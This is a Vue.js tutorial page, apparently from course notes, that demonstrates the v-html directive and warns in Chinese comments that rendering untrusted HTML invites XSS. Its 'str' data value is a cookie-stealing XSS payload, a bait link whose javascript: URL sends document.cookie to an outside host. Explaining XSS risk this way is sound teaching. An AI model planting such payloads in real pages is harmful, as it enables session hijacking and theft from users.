<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入vue -->
    <script src="../vue.js"></script>

<body>
    <!-- 
        v-html指令：
        1.作用：向指定节点中渲染包含html结构的内容
        2.与插值语法的区别：
            v-html会替换掉节点中所有的内容，插值语法不会
            v-html可以识别html结构
        3.严重注意：v-html有安全性问题！！
            在网站上动态渲染任意html是非常危险的，容易导致xss攻击。
            一定要在可信的内容上使用v-html，不要用在用户提交的内容上！
     -->
    <div id="root">
        <div>可以展示哦{{name}}</div>
        <div v-html="constru">可以解析结构不能展示inner</div>
        <div v-html="str"></div>
    </div>

</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止Vue在启动时生成生产提示
    new Vue({
        el: '#root',
        data: {
            name:'Ameliaaa',
            constru:'<h3>Ameliaaa</h3>',
            str:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到一个好东西</a>'
        }
    })
</script>

</html>
